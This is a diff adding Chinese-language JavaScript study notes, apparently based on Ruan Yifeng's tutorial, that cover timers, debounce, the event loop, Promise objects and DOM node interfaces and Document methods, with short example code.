@@ -1963,7 +1963,7 @@ obj2.a = null
 - 脱离DOM的引用：获取一个DOM元素的引用，而后面这个元素被删除，由于一直保留了对这个元素的引用，所以它也无法被回收。
 - 闭包：不合理的使用闭包，从而导致某些变量一直被留在内存中。
 
-# 阮一峰JS教程
+# 阮一峰JS基本教程
 ## 变量提升
 JavaScript 引擎的工作方式是，先解析代码，获取所有被声明的变量，然后再一行一行地运行。这造成的结果，就是所有的变量的声明语句，都会被提升到代码的头部，这就叫做变量提升（hoisting）。
 ```js
@@ -5181,3 +5181,1147 @@ launcher();
 这段代码需要三秒完成整个脚本，处在串行执行和并行执行之间。通过调节limit变量，达到效率和资源的最佳平衡。
 
 ### 定时器
+JavaScript 提供定时执行代码的功能，叫做定时器（timer），主要由setTimeout()和setInterval()这两个函数来完成。它们向任务队列添加定时任务。
+#### setTimeout()
+setTimeout函数用来指定某个函数或某段代码，在多少毫秒之后执行。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。
+
+setTimeout的第二个参数如果省略，则默认为0。除了前两个参数，setTimeout还允许更多的参数。它们将依次传入推迟执行的函数（回调函数）。
+```js
+setTimeout(function (a,b) {
+  console.log(a + b);
+}, 1000, 1, 1);
+```
+上面代码中，setTimeout共有4个参数。最后那两个参数，将在1000毫秒之后回调函数执行时，作为回调函数的参数。
+
+如果回调函数是对象的方法，那么setTimeout使得方法内部的this关键字指向全局环境，而不是定义时所在的那个对象。
+```js
+var x = 1;
+var obj = {
+  x: 2,
+  y: function () {
+    console.log(this.x);
+  }
+};
+
+setTimeout(obj.y, 1000) // 1
+```
+上面代码输出的是1，而不是2。因为当obj.y在1000毫秒后运行时，this所指向的已经不是obj了，而是全局环境。为了防止出现这个问题，一种解决方法是将obj.y放入一个函数。
+```js
+var x = 1;
+var obj = {
+  x: 2,
+  y: function () {
+    console.log(this.x);
+  }
+};
+
+setTimeout(function () {
+  obj.y();
+}, 1000);
+// 2
+```
+另一种解决方法是，使用bind方法，将obj.y这个方法绑定在obj上面。
+```js
+var x = 1;
+var obj = {
+  x: 2,
+  y: function () {
+    console.log(this.x);
+  }
+};
+
+setTimeout(obj.y.bind(obj), 1000)
+// 2
+```
+
+#### setInterval() 
+setInterval函数的用法与setTimeout完全一致，区别仅仅在于setInterval指定某个任务每隔一段时间就执行一次，也就是无限次的定时执行。与setTimeout一样，除了前两个参数，setInterval方法还可以接受更多的参数，它们会传入回调函数。
+
+setInterval的一个常见用途是实现轮询。下面是一个轮询 URL 的 Hash 值是否发生变化的例子。
+```js
+var hash = window.location.hash;
+var hashWatcher = setInterval(function() {
+  if (window.location.hash != hash) {
+    updatePage();
+  }
+}, 1000);
+```
+setInterval指定的是“开始执行”之间的间隔，并不考虑每次任务执行本身所消耗的时间。因此实际上，两次执行之间的间隔会小于指定的时间。比如，setInterval指定每 100ms 执行一次，每次执行需要 5ms，那么第一次执行结束后95毫秒，第二次执行就会开始。如果某次执行耗时特别长，比如需要105毫秒，那么它结束后，下一次执行就会立即开始。
+
+为了确保两次执行之间有固定的间隔，可以不用setInterval，而是每次执行结束后，使用setTimeout指定下一次执行的具体时间。
+```js
+var i = 1;
+var timer = setTimeout(function f() {
+  // ...
+  timer = setTimeout(f, 2000);
+}, 2000);
+```
+
+#### clearTimeout()与clearInterval()
+setTimeout和setInterval函数，都返回一个整数值，表示计数器编号。将该整数传入clearTimeout和clearInterval函数，就可以取消对应的定时器。setTimeout和setInterval返回的整数值是连续的，也就是说，第二个setTimeout方法返回的整数值，将比第一个的整数值大1。
+```js
+function f() {}
+setTimeout(f, 1000) // 10
+setTimeout(f, 1000) // 11
+setTimeout(f, 1000) // 12
+```
+利用这一点，可以写一个函数，取消当前所有的setTimeout定时器。
+```js
+(function() {
+  // 每轮事件循环检查一次
+  var gid = setInterval(clearAllTimeouts, 0);
+
+  function clearAllTimeouts() {
+    var id = setTimeout(function() {}, 0);
+    while (id > 0) {
+      if (id !== gid) {
+        clearTimeout(id);
+      }
+      id--;
+    }
+  }
+})();
+```
+
+#### 实例：debounce函数
+debounce函数的作用是，某个事件被触发n秒后再执行回调函数，如果在这n秒内又被触发，则重新计时。debounce函数常用于处理resize和scroll事件，或者按钮的点击事件。下面是一个debounce函数的实现。
+```js
+function debounce(func, wait) {
+    var timer = null
+    return function() {
+       var context = this
+       var args = arguments
+       clearTimeout(timer)
+       timer = setTimeout(function() {
+            func.apply(context, args)
+       }, wait) 
+    }
+}
+```
+
+#### 运行机制
+setTimeout和setInterval的运行机制，是将指定的代码移出本轮事件循环，等到下一轮事件循环，再检查是否到了指定时间。如果到了，就执行对应的代码；如果不到，就继续等待。这意味着，setTimeout和setInterval指定的回调函数，必须等到本轮事件循环的所有同步任务都执行完，才会开始执行。由于前面的任务到底需要多少时间执行完，是不确定的，所以没有办法保证，setTimeout和setInterval指定的任务，一定会按照预定时间执行。
+
+#### setTimeout(f, 0)
+setTimeout的作用是将代码推迟到指定时间执行，如果指定时间为0，即setTimeout(f, 0)，setTimeout(f, 0)不会立刻执行，必须要等到当前脚本的同步任务，全部处理完以后，才执行setTimeout指定的回调函数f。也就是说，setTimeout(f, 0)会在下一轮事件循环一开始就执行。
+
+setTimeout(f, 0)有几个非常重要的用途。它的一大应用是，可以调整事件的发生顺序。比如，网页开发中，某个事件先发生在子元素，然后冒泡到父元素，即子元素的事件回调函数，会早于父元素的事件回调函数触发。如果，想让父元素的事件回调函数先发生，就要用到setTimeout(f, 0)。
+```js
+// HTML 代码如下
+// <input type="button" id="myButton" value="click">
+
+var input = document.getElementById('myButton');
+
+input.onclick = function A() {
+  setTimeout(function B() {
+    input.value +=' input';
+  }, 0)
+};
+
+document.body.onclick = function C() {
+  input.value += ' body'
+};
+```
+由于setTimeout(f, 0)实际上意味着，将任务放到浏览器最早可得的空闲时段执行，所以那些计算量大、耗时长的任务，常常会被放到几个小部分，分别放到setTimeout(f, 0)里面执行。
+
+### Promise对象
+Promise 对象是 JavaScript 的异步操作解决方案，为异步操作提供统一接口。它起到代理作用（proxy），充当异步操作与回调函数之间的中介，使得异步操作具备同步操作的接口。Promise 可以让异步操作写起来，就像在写同步操作的流程，而不必一层层地嵌套回调函数。
+
+Promise 是一个对象，也是一个构造函数。Promise构造函数接受一个回调函数f1作为参数，f1里面是异步操作的代码。然后，返回的p1就是一个 Promise 实例。
+```js
+function f1(resolve, reject) {
+  // 异步代码...
+}
+
+var p1 = new Promise(f1);
+```
+传统的回调函数写法使得代码混成一团，变得横向发展而不是向下发展。Promise 就是解决这个问题，使得异步流程可以写成同步流程。
+
+#### Promise对象的状态
+Promise 对象通过自身的状态，来控制异步操作。Promise 实例具有三种状态。
+- 异步操作未完成（pending）
+- 异步操作成功（fulfilled）
+- 异步操作失败（rejected）
+
+上面三种状态里面，fulfilled和rejected合在一起称为resolved（已定型）。这三种的状态的变化途径只有两种。
+- 从“未完成”到“成功”
+- 从“未完成”到“失败”
+
+一旦状态发生变化，就凝固了，不会再有新的状态变化。这也是 Promise 这个名字的由来，它的英语意思是“承诺”，一旦承诺成效，就不得再改变了。这也意味着，Promise 实例的状态变化只可能发生一次。因此，Promise 的最终结果只有两种。
+- 异步操作成功，Promise 实例传回一个值（value），状态变为fulfilled。
+- 异步操作失败，Promise 实例抛出一个错误（error），状态变为rejected。
+
+#### Promise 构造函数
+JavaScript 提供原生的Promise构造函数，用来生成 Promise 实例。Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己实现。
+```js
+var promise = new Promise(function (resolve, reject) {
+  // ...
+
+  if (/* 异步操作成功 */){
+    resolve(value);
+  } else { /* 异步操作失败 */
+    reject(new Error());
+  }
+});
+```
+resolve函数的作用是，将Promise实例的状态从“未完成”变为“成功”（即从pending变为fulfilled），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去。reject函数的作用是，将Promise实例的状态从“未完成”变为“失败”（即从pending变为rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。
+
+#### Promise.prototype.then()
+Promise 实例的then方法，用来添加回调函数。then方法可以接受两个回调函数，第一个是异步操作成功时（变为fulfilled状态）的回调函数，第二个是异步操作失败（变为rejected）时的回调函数（该参数可以省略）。一旦状态改变，就调用相应的回调函数。
+```js
+var p1 = new Promise(function (resolve, reject) {
+  resolve('成功');
+});
+p1.then(console.log, console.error);
+// "成功"
+
+var p2 = new Promise(function (resolve, reject) {
+  reject(new Error('失败'));
+});
+p2.then(console.log, console.error);
+// Error: 失败
+```
+then方法可以链式使用。
+```js
+p1
+  .then(step1)
+  .then(step2)
+  .then(step3)
+  .then(
+    console.log,
+    console.error
+  );
+```
+最后一个then方法，回调函数是console.log和console.error，用法上有一点重要的区别。console.log只显示step3的返回值，而console.error可以显示p1、step1、step2、step3之中任意一个发生的错误。举例来说，如果step1的状态变为rejected，那么step2和step3都不会执行了（因为它们是resolved的回调函数）。Promise 开始寻找，接下来第一个为rejected的回调函数，在上面代码中是console.error。这就是说，Promise 对象的报错具有传递性。
+
+#### then()用法解析
+```js
+f1().then(function () {
+  return f2();
+}).then(f3);
+```
+f3回调函数的参数，是f2函数的运行结果。
+
+```js
+f1().then(function () {
+  f2();
+  return;
+}).then(f3);
+```
+f3回调函数的参数是undefined。
+
+```js
+f1().then(f2())
+  .then(f3);
+```
+f3回调函数的参数，是f2函数返回的函数的运行结果。
+
+```js
+f1().then(f2)
+  .then(f3);
+```
+与写法一只有一个差别，那就是f2会接收到f1()返回的结果。
+
+#### Promise的特点
+Promise 的优点在于，让回调函数变成了规范的链式写法，程序流程可以看得很清楚。它有一整套接口，可以实现许多强大的功能，比如同时执行多个异步操作，等到它们的状态都改变以后，再执行一个回调函数；再比如，为多个回调函数中抛出的错误，统一指定处理方法等等。
+
+而且，Promise 还有一个传统写法没有的好处：它的状态一旦改变，无论何时查询，都能得到这个状态。这意味着，无论何时为 Promise 实例添加回调函数，该函数都能正确执行。所以，你不用担心是否错过了某个事件或信号。如果是传统写法，通过监听事件来执行回调函数，一旦错过了事件，再添加回调函数是不会执行的。
+
+Promise 的缺点是，编写的难度比传统写法高，而且阅读代码也不是一眼可以看懂。你只会看到一堆then，必须自己在then的回调函数里面理清逻辑。
+
+## DOM
+DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作（比如增删内容）。
+
+浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。
+
+DOM 只是一个接口规范，可以用各种语言实现。所以严格地说，DOM 不是 JavaScript 语法的一部分，但是 DOM 操作是 JavaScript 最常见的任务，离开了 DOM，JavaScript 就无法控制网页。另一方面，JavaScript 也是最常用于 DOM 操作的语言。
+
+### 节点
+DOM 的最小组成单位叫做节点（node）。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。节点的类型有七种。
+- Document：整个文档树的顶层节点
+- DocumentType：doctype标签（比如`<!DOCTYPE html>`）
+- Element：网页的各种HTML标签（比如`<body>`、`<a>`等）
+- Attr：网页元素的属性（比如class="right"）
+- Text：标签之间或标签包含的文本
+- Comment：注释
+- DocumentFragment：文档的片段
+
+### 节点树
+一个文档的所有节点，按照所在的层级，可以抽象成一种树状结构。这种树状结构就是 DOM 树。它有一个顶层节点，下一层都是顶层节点的子节点，然后子节点又有自己的子节点，就这样层层衍生出一个金字塔结构，又像一棵树。浏览器原生提供document节点，代表整个文档。
+
+文档的第一层有两个节点，第一个是文档类型节点（`<!doctype html>`），第二个是 HTML 网页的顶层容器标签`<html>`。后者构成了树结构的根节点（root node），其他 HTML 标签节点都是它的下级节点。除了根节点，其他节点都有三种层级关系。
+- 父节点关系（parentNode）：直接的那个上级节点
+- 子节点关系（childNodes）：直接的下级节点
+- 同级节点关系（sibling）：拥有同一个父节点的节点
+
+DOM 提供操作接口，用来获取这三种关系的节点。比如，子节点接口包括firstChild（第一个子节点）和lastChild（最后一个子节点）等属性，同级节点接口包括nextSibling（紧邻在后的那个同级节点）和previousSibling（紧邻在前的那个同级节点）属性。
+
+### Node接口
+所有 DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法。这是 DOM 操作的基础。
+#### 属性
+- nodeType属性返回一个整数值，表示节点的类型。确定节点类型时，使用nodeType属性是常用方法。
+- nodeName属性返回节点的名称。
+- nodeValue属性返回一个字符串，表示当前节点本身的文本值，该属性可读写。只有文本节点（text）、注释节点（comment）和属性节点（attr）有文本值。
+- textContent属性返回当前节点和它的所有后代节点的文本内容。自动忽略当前节点内部的 HTML 标签，返回所有文本内容。该属性是可读写的，设置该属性的值，会用一个新的文本节点，替换所有原来的子节点。
+- baseURI属性返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。
+- Node.ownerDocument属性返回当前节点所在的顶层文档对象，即document对象。
+- Node.nextSibling属性返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回null。nextSibling属性可以用来遍历所有子节点。
+- previousSibling属性返回当前节点前面的、距离最近的一个同级节点。如果当前节点前面没有同级节点，则返回null。该属性还包括文本节点和注释节点。
+- parentNode属性返回当前节点的父节点。对于一个节点来说，它的父节点只可能是三种类型：元素节点（element）、文档节点（document）和文档片段节点（documentfragment）。
+- parentElement属性返回当前节点的父元素节点。如果当前节点没有父节点，或者父节点类型不是元素节点，则返回null。由于父节点只可能是三种类型：元素节点、文档节点（document）和文档片段节点（documentfragment）。parentElement属性相当于把后两种父节点都排除了。
+- firstChild属性返回当前节点的第一个子节点，如果当前节点没有子节点，则返回null。firstChild返回的除了元素节点，还可能是文本节点或注释节点。
+- lastChild属性返回当前节点的最后一个子节点，如果当前节点没有子节点，则返回null。用法与firstChild属性相同。
+- childNodes属性返回一个类似数组的对象（NodeList集合），成员包括当前节点的所有子节点。使用该属性，可以遍历某个节点的所有子节点。除了元素节点，childNodes属性的返回值还包括文本节点和注释节点。如果当前节点不包括任何子节点，则返回一个空的NodeList集合。由于NodeList对象是一个动态集合，一旦子节点发生变化，立刻会反映在返回结果之中。
+- isConnected属性返回一个布尔值，表示当前节点是否在文档之中。
+
+#### 方法
+- appendChild()方法接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点。该方法的返回值就是插入文档的子节点。如果参数节点是 DOM 已经存在的节点，appendChild()方法会将其从原来的位置，移动到新位置。如果appendChild()方法的参数是DocumentFragment节点，那么插入的是DocumentFragment的所有子节点，而不是DocumentFragment节点本身。返回值是一个空的DocumentFragment节点。
+- hasChildNodes方法返回一个布尔值，表示当前节点是否有子节点。子节点包括所有类型的节点，并不仅仅是元素节点。哪怕节点只包含一个空格，hasChildNodes方法也会返回true。
+- cloneNode方法用于克隆一个节点。它接受一个布尔值作为参数，表示是否同时克隆子节点。它的返回值是一个克隆出来的新节点。克隆一个节点，会拷贝该节点的所有属性，但是会丧失addEventListener方法和on-属性（即node.onclick = fn），添加在这个节点上的事件回调函数。该方法返回的节点不在文档之中，即没有任何父节点，必须使用诸如Node.appendChild这样的方法添加到文档之中。克隆一个节点之后，DOM 有可能出现两个有相同id属性（即id="xxx"）的网页元素，这时应该修改其中一个元素的id属性。如果原节点有name属性，可能也需要修改。
+- insertBefore方法用于将某个节点插入父节点内部的指定位置。insertBefore方法接受两个参数，第一个参数是所要插入的节点newNode，第二个参数是父节点parentNode内部的一个子节点referenceNode。newNode将插在referenceNode这个子节点的前面。返回值是插入的新节点newNode。如果insertBefore方法的第二个参数为null，则新节点将插在当前节点内部的最后位置，即变成最后一个子节点。如果所要插入的节点是当前 DOM 现有的节点，则该节点将从原有的位置移除，插入新的位置。如果要插入的节点是DocumentFragment类型，那么插入的将是DocumentFragment的所有子节点，而不是DocumentFragment节点本身。返回值将是一个空的DocumentFragment节点。
+- removeChild方法接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点。被移除的节点依然存在于内存之中，但不再是 DOM 的一部分。所以，一个节点移除以后，依然可以使用它，比如插入到另一个节点下面。
+- replaceChild方法用于将一个新的节点，替换当前节点的某一个子节点。
+- contains方法返回一个布尔值，表示参数节点是否满足参数节点为当前节点。参数节点为当前节点的子节点。参数节点为当前节点的后代节点。
+- compareDocumentPosition方法的用法，与contains方法完全一致，返回一个六个比特位的二进制值，表示参数节点与当前节点的关系。
+
+| 二进制值 | 十进制值 | 含义 |
+|----------|---------|------|
+| 000000 | 0 | 两个节点相同 |
+| 000001 | 1 | 两个节点不在同一个文档（即有一个节点不在当前文档） |
+| 000010 | 2 | 参数节点在当前节点的前面 |
+| 000100 | 4 | 参数节点在当前节点的后面 |
+| 001000 | 8 | 参数节点包含当前节点 |
+| 010000 | 16 | 当前节点包含参数节点 |
+| 100000 | 32 | 浏览器内部使用 |
+- isEqualNode方法返回一个布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。
+- isSameNode方法返回一个布尔值，表示两个节点是否为同一个节点。
+- normalize方法用于清理当前节点内部的所有文本节点（text）。它会去除空的文本节点，并且将毗邻的文本节点合并成一个，也就是说不存在空的文本节点，以及毗邻的文本节点。该方法是Text.splitText的逆方法。
+- getRootNode()方法返回当前节点所在文档的根节点document，与ownerDocument属性的作用相同。
+
+### NodeList接口
+NodeList实例是一个类似数组的对象，它的成员是节点对象。通过以下方法可以得到NodeList实例。
+- Node.childNodes
+- document.querySelectorAll()等节点搜索方法
+
+NodeList实例很像数组，可以使用length属性和forEach方法。但是，它不是数组，不能使用pop或push之类数组特有的方法。如果NodeList实例要使用数组方法，可以将其转为真正的数组。
+
+，NodeList 实例可能是动态集合，也可能是静态集合。所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，都会立刻反映在 NodeList 实例。目前，只有Node.childNodes返回的是一个动态集合，其他的 NodeList 都是静态集合。
+
+- length属性返回 NodeList 实例包含的节点数量。
+- forEach方法用于遍历 NodeList 的所有成员。它接受一个回调函数作为参数，每一轮遍历就执行一次这个回调函数，用法与数组实例的forEach方法完全一致。
+- item方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。所有类似数组的对象，都可以使用方括号运算符取出成员。一般情况下，都是使用方括号运算符，而不使用item方法。
+- keys()返回键名的遍历器。
+- values()返回键值的遍历器。
+- entries()返回的遍历器同时包含键名和键值的信息。
+
+### HTMLCollection接口
+HTMLCollection是一个节点对象的集合，只能包含元素节点（element），不能包含其他类型的节点。它的返回值是一个类似数组的对象，但是与NodeList接口不同，HTMLCollection没有forEach方法，只能使用for循环遍历。返回HTMLCollection实例的，主要是一些Document对象的集合属性，比如document.links、document.forms、document.images等。HTMLCollection实例都是动态集合，节点的变化会实时反映在集合中。
+
+如果元素节点有id或name属性，那么HTMLCollection实例上面，可以使用id属性或name属性引用该节点元素。如果没有对应的节点，则返回null。
+
+- length属性返回HTMLCollection实例包含的成员数量。
+- item方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。由于方括号运算符也具有同样作用，而且使用更方便，所以一般情况下，总是使用方括号运算符。
+- namedItem方法的参数是一个字符串，表示id属性或name属性的值，返回当前集合中对应的元素节点。如果没有对应的节点，则返回null。Collection.namedItem('value')等同于Collection['value']。
+
+### ParentNode接口
+如果当前节点是父节点，就会混入了（mixin）ParentNode接口。由于只有元素节点（element）、文档节点（document）和文档片段节点（documentFragment）拥有子节点，因此只有这三类节点会拥有ParentNode接口。
+
+- children属性返回一个HTMLCollection实例，成员是当前节点的所有元素子节点。该属性只读。children属性只包括元素子节点，不包括其他类型的子节点（比如文本子节点）。HTMLCollection是动态集合，会实时反映 DOM 的任何变化。
+- firstElementChild属性返回当前节点的第一个元素子节点。如果没有任何元素子节点，则返回null。
+- lastElementChild属性返回当前节点的最后一个元素子节点，如果不存在任何元素子节点，则返回null。
+- childElementCount属性返回一个整数，表示当前节点的所有元素子节点的数目。如果不包含任何元素子节点，则返回0。
+- append()方法为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面。该方法不仅可以添加元素子节点（参数为元素节点），还可以添加文本子节点（参数为字符串）。该方法没有返回值。
+- prepend()方法为当前节点追加一个或多个子节点，位置是第一个元素子节点的前面。它的用法与append()方法完全一致，也是没有返回值。
+
+### ChildNode接口
+如果一个节点有父节点，那么该节点就拥有了ChildNode接口。
+
+- remove()方法用于从父节点移除当前节点。
+- before()方法用于在当前节点的前面，插入一个或多个同级节点。两者拥有相同的父节点。该方法不仅可以插入元素节点，还可以插入文本节点。
+- after()方法用于在当前节点的后面，插入一个或多个同级节点，两者拥有相同的父节点。用法与before方法完全相同。
+- replaceWith()方法使用参数节点，替换当前节点。参数可以是元素节点，也可以是文本节点。
+
+### Document节点
+document节点对象代表整个文档，每张网页都有自己的document对象。window.document属性就指向这个对象。只要浏览器开始载入 HTML 文档，该对象就存在了，可以直接使用。document对象有不同的办法可以获取。
+- 正常的网页，直接使用document或window.document。
+- iframe框架里面的网页，使用iframe节点的contentDocument属性。
+- Ajax 操作返回的文档，使用XMLHttpRequest对象的responseXML属性。
+- 内部节点的ownerDocument属性。
+
+document对象继承了EventTarget接口和Node接口，并且混入（mixin）了ParentNode接口。这意味着，这些接口的方法都可以在document对象上调用。除此之外，document对象还有很多自己的属性和方法。
+
+#### 属性
+##### 快捷方式属性
+以下属性是指向文档内部的某个节点的快捷方式。
+- document.defaultView属性返回document对象所属的window对象。如果当前文档不属于window对象，该属性返回null。
+- document.doctype，一般是document对象的第一个字节点，指向`<DOCTYPE>`节点，即文档类型（Document Type Declaration，简写DTD）节点。HTML 的文档类型节点，一般写成`<!DOCTYPE html>`。如果网页没有声明 DTD，该属性返回null。document.firstChild通常就返回这个节点。
+- document.documentElement属性返回当前文档的根元素节点（root）。它通常是document节点的第二个子节点，紧跟在document.doctype节点后面。HTML网页的该属性，一般是`<html>`节点。
+- document.body属性指向`<body>`节点，document.head属性指向`<head>`节点。这两个属性总是存在的，如果网页源码里面省略了`<head>`或`<body>`，浏览器会自动创建。另外，这两个属性是可写的，如果改写它们的值，相当于移除所有子节点。
+- document.scrollingElement属性返回文档的滚动元素。也就是说，当文档整体滚动时，到底是哪个元素在滚动。标准模式下，这个属性返回的文档的根元素document.documentElement（即`<html>`）。兼容（quirk）模式下，返回的是`<body>`元素，如果该元素不存在，返回null。
+- document.activeElement属性返回获得当前焦点（focus）的 DOM 元素。通常，这个属性返回的是`<input>`、`<textarea>`、`<select>`等表单元素，如果当前没有焦点元素，返回`<body>`元素或null。
+- document.fullscreenElement属性返回当前以全屏状态展示的 DOM 元素。如果不是全屏状态，该属性返回null。
+
+##### 节点集合属性
+以下属性返回一个HTMLCollection实例，表示文档内部特定元素的集合。这些集合都是动态的，原节点有任何变化，立刻会反映在集合中。
+- document.links属性返回当前文档所有设定了href属性的`<a>`及`<area>`节点。
+- document.forms属性返回所有`<form>`表单节点。除了使用位置序号，id属性和name属性也可以用来引用表单。
+- document.images属性返回页面所有`<img>`图片节点。
+- document.embeds属性和document.plugins属性，都返回所有`<embed>`节点。
+- document.scripts属性返回所有`<script>`节点。
+- document.styleSheets属性返回网页内嵌或引入的 CSS 样式表集合。除了document.styleSheets属性，以上的其他集合属性返回的都是HTMLCollection实例。document.styleSheets属性返回的是StyleSheetList实例。
+
+##### 文档静态信息属性
+- document.documentURI属性和document.URL属性都返回一个字符串，表示当前文档的网址。不同之处是它们继承自不同的接口，documentURI继承自Document接口，可用于所有文档；URL继承自HTMLDocument接口，只能用于 HTML 文档。
+- document.domain属性返回当前文档的域名，不包含协议和端口。比如，网页的网址是http://www.example.com:80/hello.html，那么document.domain属性就等于www.example.com。如果无法获取域名，该属性返回null。document.domain基本上是一个只读属性，只有一种情况除外。次级域名的网页，可以把document.domain设为对应的上级域名。修改后，document.domain相同的两个网页，可以读取对方的资源，比如设置的 Cookie。设置document.domain会导致端口被改成null。因此，如果通过设置document.domain来进行通信，双方网页都必须设置这个值，才能保证端口相同。
+- Location对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过window.location和document.location属性，可以拿到这个对象。
+- document.lastModified属性返回一个字符串，表示当前文档最后修改的时间。不同浏览器的返回值，日期格式是不一样的。document.lastModified属性的值是字符串，所以不能直接用来比较。Date.parse方法将其转为Date实例，才能比较两个网页。
+- document.title属性返回当前文档的标题。默认情况下，返回`<title>`节点的值。但是该属性是可写的，一旦被修改，就返回修改后的值。
+- document.characterSet属性返回当前文档的编码，比如UTF-8、ISO-8859-1等等。
+- document.referrer属性返回一个字符串，表示当前文档的访问者来自哪里。如果无法获取来源，或者用户直接键入网址而不是从其他网页点击进入，document.referrer返回一个空字符串。document.referrer的值总是与 HTTP 头信息的Referer字段保持一致。但是，document.referrer的拼写有两个r，而头信息的Referer字段只有一个r。
+- document.dir返回一个字符串，表示文字方向。它只有两个可能的值：rtl表示文字从右到左，阿拉伯文是这种方式；ltr表示文字从左到右，包括英语和汉语在内的大多数文字采用这种方式。
+- compatMode属性返回浏览器处理文档的模式，可能的值为BackCompat（向后兼容模式）和CSS1Compat（严格模式）。一般来说，如果网页代码的第一行设置了明确的DOCTYPE（比如`<!doctype html>`），document.compatMode的值都为CSS1Compat。
+
+##### 文档状态属性
+- document.hidden属性返回一个布尔值，表示当前页面是否可见。如果窗口最小化、浏览器切换了 Tab，都会导致导致页面不可见，使得document.hidden返回true。这个属性是 Page Visibility API 引入的，一般都是配合这个 API 使用。
+- document.visibilityState返回文档的可见状态。它的值有四种可能。这个属性可以用在页面加载时，防止加载某些资源；或者页面不可见时，停掉一些页面功能。
+    - visible：页面可见。注意，页面可能是部分可见，即不是焦点窗口，前面被其他窗口部分挡住了。
+    - hidden：页面不可见，有可能窗口最小化，或者浏览器切换到了另一个 Tab。
+    - prerender：页面处于正在渲染状态，对于用户来说，该页面不可见。
+    - unloaded：页面从内存里面卸载了。
+- document.readyState属性返回当前文档的状态，共有三种可能的值。每次状态变化都会触发一个readystatechange事件。
+    - loading：加载 HTML 代码阶段（尚未完成解析）
+    - interactive：加载外部资源阶段
+    - complete：加载完成
+    - 属性变化的过程如下。
+        - 浏览器开始解析 HTML 文档，document.readyState属性等于loading。
+        - 浏览器遇到 HTML 文档中的`<script>`元素，并且没有async或defer属性，就暂停解析，开始执行脚本，这时document.readyState属性还是等于loading。
+        - HTML 文档解析完成，document.readyState属性变成interactive。
+        - 浏览器等待图片、样式表、字体文件等外部资源加载完成，一旦全部加载完成，document.readyState属性变成complete。
+- document.cookie属性用来操作浏览器 Cookie。
+- document.designMode属性控制当前文档是否可编辑。该属性只有两个值on和off，默认值为off。一旦设为on，用户就可以编辑整个文档的内容。
+- document.currentScript属性只用在`<script>`元素的内嵌脚本或加载的外部脚本之中，返回当前脚本所在的那个 DOM 节点，即`<script>`元素的 DOM 节点。
+- document.implementation属性返回一个DOMImplementation对象。该对象有三个方法，主要用于创建独立于当前文档的新的 Document 对象。
+    - DOMImplementation.createDocument()：创建一个 XML 文档。
+    - DOMImplementation.createHTMLDocument()：创建一个 HTML 文档。
+    - DOMImplementation.createDocumentType()：创建一个 DocumentType 对象
+
+#### 方法
+- document.open方法清除当前文档所有内容，使得文档处于可写状态，供document.write方法写入内容。
+- document.close方法用来关闭document.open()打开的文档。
+- document.write方法用于向当前文档写入内容。在网页的首次渲染阶段，只要页面没有关闭写入（即没有执行document.close()），document.write写入的内容就会追加在已有内容的后面。document.write是 JavaScript 语言标准化之前就存在的方法，现在完全有更符合标准的方法向文档写入内容（比如对innerHTML属性赋值）。所以，除了某些特殊情况，应该尽量避免使用document.write这个方法。
+- document.writeln方法与write方法完全一致，除了会在输出内容的尾部添加换行符。
+- document.querySelector方法接受一个 CSS 选择器作为参数，返回匹配该选择器的元素节点。如果有多个节点满足匹配条件，则返回第一个匹配的节点。如果没有发现匹配的节点，则返回null。
+- document.querySelectorAll方法与querySelector用法类似，区别是返回一个NodeList对象，包含所有匹配给定选择器的节点。
+- document.getElementsByTagName()方法搜索 HTML 标签名，返回符合条件的元素。
+- document.getElementsByClassName()方法返回一个类似数组的对象（HTMLCollection实例），包括了所有class名字符合指定条件的元素，元素的变化实时反映在返回结果中。
+- document.getElementsByName()方法用于选择拥有name属性的 HTML 元素（比如`<form>`、`<radio>`、`<img>`、`<frame>`、`<embed>`和`<object>`等），返回一个类似数组的的对象（NodeList实例），因为name属性相同的元素可能不止一个。
+- document.getElementById()方法返回匹配指定id属性的元素节点。如果没有发现匹配的节点，则返回null。
+- document.elementFromPoint()方法返回位于页面指定位置最上层的元素节点。
+- document.createElement方法用来生成元素节点，并返回该节点。
+- document.createTextNode方法用来生成文本节点（Text实例），并返回该节点。它的参数是文本节点的内容。
+- document.createAttribute方法生成一个新的属性节点（Attr实例），并返回它。
+- document.createComment方法生成一个新的注释节点，并返回该节点。
+- document.createDocumentFragment方法生成一个空的文档片段对象（DocumentFragment实例）。
+- document.createEvent方法生成一个事件对象（Event实例），该对象可以被element.dispatchEvent方法使用，触发指定事件。
+- document.addEventListener()，document.removeEventListener()，document.dispatchEvent()这三个方法用于处理document节点的事件。它们都继承自EventTarget接口。
+- document.hasFocus方法返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。
+- document.adoptNode方法将某个节点及其子节点，从原来所在的文档或DocumentFragment里面移除，归属当前document对象，返回插入后的新节点。插入的节点对象的ownerDocument属性，会变成当前的document对象，而parentNode属性是null。
+- document.importNode方法则是从原来所在的文档或DocumentFragment里面，拷贝某个节点及其子节点，让它们归属当前document对象。拷贝的节点对象的ownerDocument属性，会变成当前的document对象，而parentNode属性是null。
+- document.createNodeIterator方法返回一个子节点遍历器。
